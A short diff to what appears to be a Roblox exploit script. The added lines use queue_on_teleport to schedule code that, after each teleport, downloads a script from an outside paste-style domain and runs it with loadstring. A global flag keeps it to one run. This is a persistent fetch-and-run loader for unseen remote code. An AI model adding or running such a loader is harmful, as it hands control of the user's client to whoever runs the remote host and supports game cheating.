@@ -11,3 +11,8 @@ getgenv().buttonclick = function(button)
 end
 getgenv().players = game:GetService"Players"
 getgenv().client = game:GetService"Players".LocalPlayer
+local Queue = queue_on_teleport or syn and syn.queue_on_teleport
+if Queue and not AlreadyAutoExecute then
+	Queue'repeat wait() until game:IsLoaded()\nloadstring(game:HttpGet"https://pastebinp.com/raw/eccv9pgu")()'
+	getgenv().AlreadyAutoExecute = true
+end
